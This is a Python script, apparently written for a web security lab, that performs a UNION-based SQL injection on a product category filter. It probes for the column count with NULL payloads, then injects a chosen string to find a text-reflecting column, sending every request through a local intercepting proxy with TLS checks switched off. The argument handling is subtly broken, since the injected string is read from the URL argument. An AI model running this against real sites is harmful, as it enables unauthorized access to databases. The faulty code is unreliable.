import requests
import urllib3
import sys
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def exploit_sqli(url, output_string):
    uri = url.rstrip('/') + '/filter?category='
    column_count = get_column_count(url)
    for i in range(1,column_count+1):
        payload_list = ['NULL'] * column_count
        payload_list[i-1] = "'" + output_string + "'"
        sqli_payload = "' UNION SELECT " + ','.join(payload_list) + '--'
        res = requests.get(uri + sqli_payload, verify=False, proxies=proxies)
        if output_string.strip('\'') in res.text:
            return i
    return False

def get_column_count(url):
    uri = url.rstrip('/') + '/filter?category='
    for i in range(1,10):
        sqli_payload = "' UNION SELECT NULL" + (i-1)*",NULL" + "--" 
        res = requests.get(uri + sqli_payload, verify=False, proxies=proxies)
        
        if res.status_code == 200:
            return i
    return False

if __name__ == '__main__':
    try:
        url = sys.argv[1].strip()
        output_string = sys.argv[1].strip()
    except IndexError:
        print('[-] Usage: %s <url> <string_to_output>' % sys.argv[0])
        print('[-] Usage: %s http://example.com' % sys.argv[0])
        sys.exit(-1)
    
    print('Figuring out the number of columns...')

    number_of_text_column = exploit_sqli(url, output_string)
    if number_of_text_column:
        print('[+] SQL Injection successfull.')
        print('[+] The number of the column containing a string is %s.' % str(number_of_text_column))
    else:
        print('[-] SQL Injection failed!')